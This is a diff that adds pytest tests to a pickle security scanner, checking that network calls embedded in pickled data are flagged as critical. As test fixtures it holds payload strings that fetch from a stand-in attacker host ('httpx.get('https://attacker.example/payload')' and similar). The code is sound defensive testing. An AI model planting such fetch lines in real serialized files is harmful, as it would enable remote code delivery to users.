@@ -1489,6 +1489,48 @@ def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
     )
 
 
+def test_scan_stream_keeps_later_network_function_after_inert_url_actionable() -> None:
+    payload = pickle.dumps(
+        {
+            "docs": "https://docs.example.invalid/reference/requests.get(url)",
+            "loader": "requests.get(endpoint)",
+        },
+        protocol=0,
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-function-code.pkl")
+
+    assert any(
+        issue.rule_code == "S302"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "network_function"
+        and issue.details.get("function") == "requests.get"
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "httpx.get('https://attacker.example/payload')",
+        "aiohttp.ClientSession().get('https://attacker.example/payload')",
+    ],
+)
+def test_scan_stream_keeps_supported_http_client_url_actionable(literal: str) -> None:
+    payload = pickle.dumps({"loader": literal}, protocol=0)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="http-client-code.pkl")
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
 def test_scan_stream_keeps_spaced_network_attribute_url_actionable() -> None:
     payload = pickle.dumps({"loader": "requests . get('https://attacker.example/payload')"}, protocol=0)
 
